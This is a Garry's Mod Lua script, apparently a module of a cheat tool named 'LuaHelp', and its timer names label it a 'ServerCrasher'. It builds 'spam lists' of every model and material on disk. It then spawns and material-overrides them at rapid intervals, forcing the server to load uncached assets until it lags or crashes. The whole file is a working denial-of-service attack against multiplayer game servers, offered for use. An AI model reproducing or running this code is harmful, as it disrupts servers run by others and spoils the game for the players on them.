local ModelList = {}
local ModelFoldersToAdd = {}
local MaterialList = {}
local MaterialFoldersToAdd = {}

self:CreateToggleCommand ("ModelDiskAccess", "Start Caching Models", "Stop Caching Models",
function (self)
	RunConsoleCommand ("gm_spawn", "models/combine_helicopter/helicopter_bomb01.mdl")
	timer.Create (self.CommandName, 0.05, 0, function ()
		local model = table.GetFirstKey (ModelList)
		if !model then
			if !table.GetFirstKey (ModelFoldersToAdd) then
				StartPopulatingModels ()
			end
			return
		end
		ModelList [model] = nil
		local canspawn = true
		if string.find (model, "ent_") then
			canspawn = false
		end
		if canspawn then
			RunConsoleCommand ("undo")
			timer.Simple (0.02, function (model)
				Msg (LocalPlayer ():Name () .. " spawned model \"models/" .. model .. "\".\n")
				RunConsoleCommand ("gm_spawn", "models/" .. model)
			end, model)
		end
	end)
end,
function (self)
	RunConsoleCommand ("undo")
	timer.Destroy (self.CommandName)
end)

self:CreateToggleCommand ("MaterialDiskAccess", "Start Caching Materials", "Stop Caching Materials",
function (self)
	self.TargetEntity = nil

	function self:ObtainEntity ()
		RunConsoleCommand ("gm_spawn", "models/combine_helicopter/helicopter_bomb01.mdl")
		timer.Simple (0.5, function (self)
			local tr = util.TraceLine (util.GetPlayerTrace (LocalPlayer ()))
			if tr.HitNonWorld then
				self.TargetEntity = tr.Entity
			else
				RunConsoleCommand ("undo")
				self:ObtainEntity ()
			end
		end, self)
	end

	self:ObtainEntity ()

	timer.Create (self.CommandName, 0.07, 0, function (self)
		if self.TargetEntity and !self.TargetEntity:IsValid () then
			self.TargetEntity = nil
			self:ObtainEntity ()
		end
		if !self.TargetEntity then
			return
		end
		local mat = table.GetFirstKey (MaterialList)
		if !mat then
			if !table.GetFirstKey (MaterialFoldersToAdd) then
				StartPopulatingMaterials ()
			end
			return
		end
		MaterialList [mat] = nil
		local cando = true
		if string.find (mat, "ent_") then
			cando = false
		end
		if cando then
			if LocalPlayer ():GetActiveWeapon () and LocalPlayer ():GetActiveWeapon ():IsValid () then
				if LocalPlayer ():GetActiveWeapon ():GetClass () != "gmod_tool" or
				   LocalPlayer ():GetActiveWeapon ().Mode != "material" then
					RunConsoleCommand ("tool_material")
				end
			end
			RunConsoleCommand ("material_override", mat)
			LocalPlayer ():SetEyeAngles ((self.TargetEntity:GetPos () - LocalPlayer ():GetShootPos ()):Angle ())
			timer.Simple (0.01, function (model)
				Msg (LocalPlayer ():Name () .. " cached material \"materials/" .. mat .. "\".\n")
				RunConsoleCommand ("+attack")
				timer.Simple (0.03, function ()
					RunConsoleCommand ("-attack")
				end)
			end, mat)
		end
	end, self)
end,
function (self)
	RunConsoleCommand ("undo")
	timer.Destroy (self.CommandName)
end)

local function SaveList (list, path)
	local tbl = list
	local newtbl = {}
	for k, v in pairs (tbl) do
		table.insert (newtbl, k)
	end
	file.Write (path, util.TableToKeyValues (newtbl))
end

local function LoadList (path)
	local tbl =  util.KeyValuesToTable (file.Read (path))
	local newtbl = {}
	for k, v in pairs (tbl) do
		newtbl [v] = true
	end
	return newtbl
end

local function StartPopulatingMaterials ()
	if table.GetFirstKey (MaterialFoldersToAdd) then
		return
	end
	MaterialFoldersToAdd [""] = true
	LuaHelp.LogLine ("Started populating material spam list.")
	timer.Create ("LuaHelp.ServerCrasher.DiskAccess.PopulateMaterials", 0.5, 0, function ()
		local Folder = table.GetFirstKey (MaterialFoldersToAdd)
		if Folder then
			MaterialFoldersToAdd [Folder] = nil
			local files = file.Find ("../materials/" .. Folder .. "*")
			for k, v in pairs (files) do
				local ext = string.GetExtensionFromFilename (v)
				if string.lower (ext) == "vmt" then
					MaterialList [Folder .. v] = true
				elseif !ext or string.len (ext) == 0 then
					MaterialFoldersToAdd [Folder .. v .. "/"] = true
				end
			end
		else
			LuaHelp.LogLine ("Finished populating material spam list.")
			SaveList (MaterialList, "luahelp/material_list.txt")
			timer.Destroy ("LuaHelp.ServerCrasher.DiskAccess.PopulateMaterials")
		end
	end)
end

local function StartPopulatingModels ()
	if table.GetFirstKey (ModelFoldersToAdd) then
		return
	end
	ModelFoldersToAdd [""] = true
	LuaHelp.LogLine ("Started populating model spam list.")
	timer.Create ("LuaHelp.ServerCrasher.DiskAccess.PopulateModels", 0.5, 0, function ()
		local Folder = table.GetFirstKey (ModelFoldersToAdd)
		if Folder then
			ModelFoldersToAdd [Folder] = nil
			local files = file.Find ("../models/" .. Folder .. "*")
			for k, v in pairs (files) do
				local ext = string.GetExtensionFromFilename (v)
				if string.lower (ext) == "mdl" then
					ModelList [Folder .. v] = true
				elseif !ext or string.len (ext) == 0 then
					ModelFoldersToAdd [Folder .. v .. "/"] = true
				end
			end
		else
			LuaHelp.LogLine ("Finished populating model spam list.")
			SaveList (ModelList, "luahelp/model_list.txt")
			timer.Destroy ("LuaHelp.ServerCrasher.DiskAccess.PopulateModels")
		end
	end)
end

timer.Simple (2, function ()
	if file.Exists ("luahelp/material_list.txt") then
		MaterialList = LoadList ("luahelp/material_list.txt")
	else
		StartPopulatingMaterials ()
	end
	if file.Exists ("luahelp/model_list.txt") then
		ModelList = LoadList ("luahelp/model_list.txt")
	else
		StartPopulatingModels ()
	end
end)

LuaHelp.AddUninitHook (function ()
	ModelList = nil
	ModelFoldersToAdd = nil
	timer.Destroy ("LuaHelp.ServerCrasher.DiskAccess.PopulateModels")

	MaterialList = nil
	MaterialFoldersToAdd = nil
	timer.Destroy ("LuaHelp.ServerCrasher.DiskAccess.PopulateMaterials")
end)